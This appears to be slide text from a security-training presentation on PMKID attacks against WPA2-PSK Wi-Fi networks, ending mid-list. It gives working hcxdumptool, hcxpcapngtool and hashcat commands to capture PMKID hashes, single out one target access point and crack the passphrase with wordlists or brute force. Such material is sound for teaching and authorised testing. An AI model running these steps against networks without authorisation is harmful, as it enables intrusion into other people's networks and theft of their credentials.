PMKID Attacks

• Pairwise master key identifier
• New way of attack
• Targets WPA2 PSK
• Traditional HS capture requires client!
• Doesn’t need any client connected to AP
• Requires some additional tooling:
hcxtools
hcxdumptool
PMKID Attacks
(Overview)

• Attacker must capture EAPOL handshake
• Then PMKID is extracted 
• PMKID is a hash value generated using AP 
SSID, client MAC and PMK
• Offline dictionary attack (i.e password lists, 
brute, rainbow tables)
• Hash comparison - if match (password is 
cracked)
PMKID Attacks
(How it works)

• hcxdumptool -i wlan1 -o PMKID --enable-
status=1
On interface wlan1
write captured hash to PMKID file
enable status 1 for EAPOL
Will capture all PMKID on wlan1 
PMKID Attacks
(Step-by-step – capture all)

To capture just the PMKID of a specific AP:
create a textfile and call it: hack
Inside put just the MAC of the target AP
00:11:22:33:44:55
then run
hcxdumptool -i wlan1 -o test.pcapng --enable-
status=1 --filterlist_ap=hack filtermode=2
PMKID Attacks
(Step-by-step – target 1 AP)

hcxpcapngtool -o all-hashes.txt *.pcapng
Write all hashes to all-hashes.txt which are 
present in any .pcapng file in current directory
Crack:
hashcat -m 22000 all-hashes.txt rockyou.txt -w 
4
-m = hashtype followed by hashes to be 
cracked, followed by dict file and workload 
profile
PMKID Attacks
(Extract captured hashes)

# For wordlist cracking
hashcat -m 22000 -o password.txt 
YOURFILENAMEHERE.hc22000 
/usr/share/wordlists/rockyou.txt
#For brute-force cracking
hashcat -m 22000 hash.hc22000 -a 3

# for brute forcing with increments
